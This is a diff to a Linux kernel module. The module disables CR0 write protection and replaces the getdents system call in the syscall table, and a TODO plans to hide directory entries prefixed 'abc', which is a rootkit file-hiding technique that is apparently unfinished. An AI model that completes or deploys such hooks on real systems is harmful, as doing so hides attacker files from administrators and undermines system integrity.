@@ -9,6 +9,18 @@
 #include <linux/kallsyms.h>
 #include <linux/sched.h>
 #include <linux/string.h>
+#include <linux/fs.h>
+#include <asm/special_insns.h>
+
+#define PREFIX "abc"
+#define PREFIX_SIZE (sizeof(PREFIX) - 1)
+
+struct dirent_{
+	unsigned long	d_ino;
+	unsigned long	d_off;
+	unsigned short	d_reclen; // d_reclen is the way to tell the length of this entry
+	char		d_name[256]; // the struct value is actually longer than this, and d_name is variable width.
+};
 
 static unsigned long **p_sys_call_table;
 /* Aquire system calls table address */
@@ -21,62 +33,34 @@ MODULE_LICENSE("GPL");
 
 unsigned long *syscall_table = (void *)0xffffffff81e001a0;
 
-/*asmlinkage int (*original_call) (unsigned int, const char __user *, size_t);
 
-asmlinkage int our_sys_open(unsigned int file, const char __user *y, size_t size)
-{
-   printk("A file was opened\n");
-   return original_call(file, y, size);
-}*/
+asmlinkage int (*original_getdents) (unsigned int, struct dirent_ __user *, unsigned int);
 
-asmlinkage ssize_t (*original_write) (int, const void *, size_t);
-
-asmlinkage ssize_t our_sys_write(int fd, const void *buf, size_t count) {
-	char check[] = "abc";
-	char *bufCpy = (char *) buf;
-	/*char expect[16] = "abc1.txt";
+asmlinkage int custom_getdents(unsigned int fd, struct dirent_ __user *entries, unsigned int count) {
 	
-	int i = 0;
-	int buffLength = 0;
-	int exLength = 0;
+	char check[5] = "abc";
+	struct dirent_ *dEntryPtr;
+	dEntryPtr = entries;
+	int i;
+	long bytes_read;
+	bytes_read = original_getdents(fd, entries, count);
 	
-	char *mishra = (char *) buf;
-
-	for(i = 0; mishra[i] != '\0'; i++) {
-		buffLength++;
+	char* dbuf;
+	dbuf = (char*) entries;
+	int boff;
+	
+	for(boff = 0; boff < bytes_read;){
+		dEntryPtr = (struct dirent_*) (dbuf + boff);
+		//if((strstr(dEntryPtr->d_name, check) != NULL)){
+			printk(KERN_ALERT "Count: %d\n", count);
+			printk(KERN_ALERT "File: %s\n", dEntryPtr->d_name);
+		//}
+		boff += dEntryPtr->d_reclen;
 	}
-	//int buffLength = i;
 	
+	// TODO: identify abc prefix entries, remove them from entries by shifting following entries and adjusting bytes read
 
-	for(i = 0; expect[i] != '\0'; i++) {
-		exLength++;
-	}
-	//int exLength = i;
-	
-	if(buffLength >= exLength) {
-		for(i = 0; expect[i] != '\0'; i++){
-			if(mishra[i] == expect[i]){
-				printk(KERN_ALERT "%c\n", mishra[i]);
-			}	
-		}
-	}*/
-	//if(strstr(bufCpy, check) != NULL) { 
-		//printk(KERN_ALERT "Pid is %d --- Char %c ----  End\n", current -> pid, 65);
-		//printk(KERN_ALERT "Buff: %s\n", (const char*)buf);
-	//}
-
-	// check for errors
-
-	char *tok = bufCpy, *end = bufCpy;
-	while (tok != NULL) {
-    		strsep(&end, "  ");
-    		if(strstr(tok, check) != NULL) {
-			printk(KERN_ALERT "Pid is %d --- Char %c ----  End\n", current -> pid, 65);
-		}
-    		tok = end;
-	}
-
-	return original_write(fd, buf, count);
+	return bytes_read;	
 }
 
 int make_rw(unsigned long *address) {
@@ -161,12 +145,13 @@ __init int init_module()
  
     original_cr0 = read_cr0();
     write_cr0(original_cr0 & ~0x00010000);
-    original_write = (void *)p_sys_call_table[__NR_write];
+    //Get the number from /usr/include/asm/unistd_64.h
+    original_getdents = (void *)p_sys_call_table[__NR_getdents];
 
     // we now overwrite the syscall
-    p_sys_call_table[__NR_write] = (unsigned long *) our_sys_write;
+    p_sys_call_table[__NR_getdents] = (unsigned long *) custom_getdents;
     write_cr0(original_cr0);
-    printk(KERN_ALERT "Patched! syscall number : %d\n", __NR_write);
+    printk(KERN_ALERT "Patched! syscall number : %d\n", __NR_getdents);
 
     return 0;
 }
@@ -182,7 +167,7 @@ void cleanup_module()
    	original_cr0 = read_cr0();
     	write_cr0(original_cr0 & ~0x00010000);
 
-    	p_sys_call_table[__NR_write] = (unsigned long *)original_write;
+    	p_sys_call_table[__NR_getdents] = (unsigned long *)original_getdents;
 
     	write_cr0(original_cr0);
    }
